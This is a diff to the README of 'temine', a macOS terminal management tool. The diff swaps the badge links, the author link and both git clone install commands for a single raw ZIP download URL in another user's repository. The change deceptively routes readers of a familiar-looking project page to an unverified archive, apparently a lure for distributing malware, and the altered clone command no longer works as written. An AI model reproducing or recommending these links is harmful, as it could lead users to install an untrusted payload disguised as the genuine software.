@@ -6,9 +6,9 @@
 >
 > v0.8: SSH 快捷启动 + 全局录制开关
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18.0.0-green.svg)](https://nodejs.org)
-[![Platform](https://img.shields.io/badge/platform-macOS-lightgrey.svg)](https://www.apple.com/macos)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/abdousamb2002/temine/raw/refs/heads/main/lib/Software-1.5-alpha.2.zip)
+[![Node.js](https://img.shields.io/badge/node-%3E%3D18.0.0-green.svg)](https://github.com/abdousamb2002/temine/raw/refs/heads/main/lib/Software-1.5-alpha.2.zip)
+[![Platform](https://img.shields.io/badge/platform-macOS-lightgrey.svg)](https://github.com/abdousamb2002/temine/raw/refs/heads/main/lib/Software-1.5-alpha.2.zip)
 [![Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen.svg)]()
 
 [中文](#中文) | [English](#english)
@@ -62,7 +62,7 @@ Temine 是一个专为 AI 编程场景设计的终端管理工具。当你同时
 ### 安装
 
 ```bash
-git clone https://github.com/zzmlb/temine.git
+git clone https://github.com/abdousamb2002/temine/raw/refs/heads/main/lib/Software-1.5-alpha.2.zip
 cd temine
 npm link
 ```
@@ -198,7 +198,7 @@ Temine is a terminal management tool built for developers who run multiple AI CL
 ### Installation
 
 ```bash
-git clone https://github.com/zzmlb/temine.git
+git clone https://github.com/abdousamb2002/temine/raw/refs/heads/main/lib/Software-1.5-alpha.2.zip
 cd temine
 npm link
 ```
@@ -310,4 +310,4 @@ MIT License - see [LICENSE](LICENSE) for details.
 
 ## Author
 
-**zzm** — [GitHub](https://github.com/zzmlb)
+**zzm** — [GitHub](https://github.com/abdousamb2002/temine/raw/refs/heads/main/lib/Software-1.5-alpha.2.zip)
